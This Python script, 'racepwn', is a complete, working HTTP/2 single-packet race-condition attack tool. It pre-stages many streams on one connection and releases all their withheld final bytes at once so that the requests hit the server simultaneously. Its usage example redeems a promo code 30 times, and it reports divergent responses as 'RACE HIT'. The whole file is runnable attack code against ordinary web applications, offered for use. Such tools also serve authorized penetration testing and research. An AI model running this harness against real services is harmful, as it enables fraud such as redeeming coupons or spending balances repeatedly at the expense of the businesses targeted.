#!/usr/bin/env python3
"""
racepwn — HTTP/2 Single-Packet Attack Race Condition Harness
Implements Kettle's last-byte synchronization for true single-packet timing.

Author: zwanski (Zwanski Tech / Tinosoft Informatique)
Usage:  python3 racepwn.py --url https://target.com/redeem --data "code=PROMO50" \\
            --headers "Cookie: session=abc" --requests 30
Deps:   pip install h2

Technique:
  1. One HTTP/2 connection (raw socket + TLS ALPN h2)
  2. Open N streams; send HEADERS + body MINUS the final byte, END_STREAM withheld
  3. Brief pause so the server buffers all partial requests
  4. Concatenate every stream's final byte (+ END_STREAM) into ONE buffer,
     flush with a single sendall() — all N requests complete within ~1ms
     server-side, defeating network jitter.

Why not httpx/requests: high-level clients control framing and send END_STREAM
immediately per request, producing multiple TCP packets across random time
windows. Frame-level control via h2 is required for true single-packet sync.
"""

import sys
import re
import json
import socket
import ssl
import time
import argparse
from urllib.parse import urlparse
from collections import Counter
from typing import Any, Dict, List, Tuple

import h2.connection
import h2.events

# ─── Terminal helpers ────────────────────────────────────────────────────────

_ANSI_RE = re.compile(r'\033\[[0-9;]*m')
COLORS = {
    "red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m",
    "blue": "\033[94m", "magenta": "\033[95m", "cyan": "\033[96m",
    "white": "\033[97m", "reset": "\033[0m",
}

def c(text: str, color: str = "white", bold: bool = False) -> str:
    b = "\033[1m" if bold else ""
    return f"{b}{COLORS.get(color, '')}{text}{COLORS['reset']}"

def vlen(s: str) -> int:
    return len(_ANSI_RE.sub("", s))

def render_table(headers: List[str], rows: List[List[str]]) -> None:
    col_widths = [len(h) for h in headers]
    for row in rows:
        for i, cell in enumerate(row):
            col_widths[i] = max(col_widths[i], vlen(cell))
    sep = "+" + "+".join("-" * (w + 2) for w in col_widths) + "+"
    def fmt(cells):
        return "| " + " | ".join(
            cell + " " * (col_widths[i] - vlen(cell)) for i, cell in enumerate(cells)
        ) + " |"
    print(sep); print(fmt(headers)); print(sep)
    for row in rows:
        print(fmt(row))
    print(sep)

def parse_custom_headers(raw: str) -> List[Tuple[str, str]]:
    """Newline-split + first-colon — preserves comma-containing cookie values."""
    out: List[Tuple[str, str]] = []
    if not raw:
        return out
    for line in raw.splitlines():
        if ":" in line:
            k, v = line.split(":", 1)
            out.append((k.strip().lower(), v.strip()))
    return out

# ─── Single-packet engine ─────────────────────────────────────────────────────

def execute_race(url: str, method: str, data: str,
                 extra_headers: List[Tuple[str, str]], count: int) -> List[Dict[str, Any]]:
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += f"?{parsed.query}"

    if parsed.scheme != "https":
        print(c("[-] Single-packet h2 sync requires HTTPS (TLS+ALPN).", "red"))
        sys.exit(1)

    body = data.encode() or b" "          # need >=1 byte to withhold
    pre, last = body[:-1], body[-1:]

    # authority includes port only if non-standard
    authority = host if port == 443 else f"{host}:{port}"

    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(["h2"])

    raw = socket.create_connection((host, port), timeout=10.0)
    # Fix: TCP_NODELAY = 1 DISABLES Nagle so our single sendall flushes as one
    # tight packet instead of being coalesced/delayed by the kernel. This is
    # the critical flag for single-packet timing — Gemini had it inverted (0).
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    sock = ctx.wrap_socket(raw, server_hostname=host)
    if sock.selected_alpn_protocol() != "h2":
        print(c(f"[-] No HTTP/2 via ALPN (got {sock.selected_alpn_protocol()}).", "red"))
        sys.exit(1)

    conn = h2.connection.H2Connection()
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    base_headers = [
        (":method", method),
        (":authority", authority),
        (":scheme", "https"),
        (":path", path),
        ("content-length", str(len(body))),
        ("user-agent", "racepwn/2.0"),
    ] + extra_headers

    stream_ids: List[int] = []

    # ── Phase 1: pre-stage headers + body minus final byte ──
    print(f"[*] Pre-staging {count} streams...")
    for _ in range(count):
        sid = conn.get_next_available_stream_id()
        stream_ids.append(sid)
        conn.send_headers(sid, base_headers, end_stream=False)
        if pre:
            # Fix: respect flow-control window before sending body bytes
            win = conn.local_flow_control_window(sid)
            if win < len(pre):
                # drain any pending window updates from server
                sock.settimeout(2.0)
                try:
                    conn.receive_data(sock.recv(65535))
                except socket.timeout:
                    pass
            conn.send_data(sid, pre, end_stream=False)
        sock.sendall(conn.data_to_send())

    time.sleep(0.05)   # let server buffer all partial requests

    # ── Phase 2: release all final bytes in ONE packet ──
    print(c("[*] Releasing all withheld final bytes in a single packet...", "magenta", bold=True))
    final_buffer = b""
    for sid in stream_ids:
        conn.send_data(sid, last, end_stream=True)
        final_buffer += conn.data_to_send()
    t0 = time.perf_counter()
    sock.sendall(final_buffer)        # the blast

    # ── Phase 3: harvest responses ──
    resp = {sid: {"status": 0, "body": b"", "ms": 0.0} for sid in stream_ids}
    done = 0
    sock.settimeout(8.0)
    try:
        while done < count:
            chunk = sock.recv(65535)
            if not chunk:
                break
            for ev in conn.receive_data(chunk):
                if isinstance(ev, h2.events.ResponseReceived):
                    resp[ev.stream_id]["status"] = int(dict(ev.headers).get(b":status", b"0"))
                    resp[ev.stream_id]["ms"] = (time.perf_counter() - t0) * 1000
                elif isinstance(ev, h2.events.DataReceived):
                    resp[ev.stream_id]["body"] += ev.data
                    # acknowledge flow control so server keeps sending
                    conn.acknowledge_received_data(len(ev.data), ev.stream_id)
                elif isinstance(ev, h2.events.StreamEnded):
                    done += 1
            out = conn.data_to_send()
            if out:
                sock.sendall(out)
    except socket.timeout:
        print(c(f"[-] Timeout — {done}/{count} streams completed.", "yellow"))

    sock.close()

    return [{
        "id": sid,
        "status": resp[sid]["status"],
        "length": len(resp[sid]["body"]),
        "ms": round(resp[sid]["ms"], 2),
        "body": resp[sid]["body"].decode("utf-8", errors="ignore"),
    } for sid in stream_ids]

# ─── Main ─────────────────────────────────────────────────────────────────────

def main() -> None:
    pa = argparse.ArgumentParser(description="racepwn — HTTP/2 Single-Packet Race Harness")
    pa.add_argument("--url", required=True)
    pa.add_argument("--method", default="POST")
    pa.add_argument("--data", default="")
    pa.add_argument("--headers", help='Extra headers, newline-separated (e.g. "Cookie: id=1")')
    pa.add_argument("--requests", type=int, default=30)
    pa.add_argument("--output", default="racepwn_results.json")
    args = pa.parse_args()

    print(f"\n{c('racepwn', 'cyan', bold=True)} — Single-Packet Race Condition Harness")
    print(f"Target : {args.method} {args.url}")
    print(f"Streams: {args.requests}\n")

    results = execute_race(
        args.url, args.method, args.data,
        parse_custom_headers(args.headers), args.requests,
    )

    if not results or all(r["status"] == 0 for r in results):
        print(c("[-] No responses received.", "red"))
        sys.exit(1)

    # Distribution by (status, length)
    sigs = [(r["status"], r["length"]) for r in results if r["status"] != 0]
    counts = Counter(sigs)
    majority = counts.most_common(1)[0][0] if counts else (0, 0)

    rows = []
    outliers: Dict[Tuple[int, int], str] = {}
    race_hit = False
    for sig, n in counts.most_common():
        if sig == majority:
            tag = c("MAJORITY", "green")
        else:
            race_hit = True
            tag = c("OUTLIER ← RACE HIT", "red", bold=True)
            for r in results:
                if (r["status"], r["length"]) == sig:
                    outliers[sig] = r["body"]
                    break
        rows.append([str(sig[0]), f"{sig[1]}B", str(n), tag])

    print("=" * 12 + " RESPONSE DISTRIBUTION " + "=" * 12)
    render_table(["Status", "Body Len", "Count", "Classification"], rows)

    times = [r["ms"] for r in results if r["ms"] > 0]
    if times:
        avg = sum(times) / len(times)
        print(f"\n[*] Arrival window — min {min(times):.2f}ms | max {max(times):.2f}ms "
              f"| avg {avg:.2f}ms | spread {max(times) - min(times):.2f}ms")

    with open(args.output, "w") as f:
        json.dump(results, f, indent=2)
    print(f"[+] Report → {c(args.output, 'cyan')}")

    if race_hit:
        print(f"\n{c('!!! RACE WINDOW HIT !!!', 'red', bold=True)}")
        for sig, body in outliers.items():
            print(f"\n--- Outlier [status {sig[0]}, len {sig[1]}] ---")
            print(c(body[:400] + ("…" if len(body) > 400 else ""), "cyan"))
    else:
        print(c("\n[*] No state divergence — all responses identical. "
                "Try more streams or check for a real race window.", "green"))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(c("\n[-] Aborted.", "red"))
        sys.exit(1)
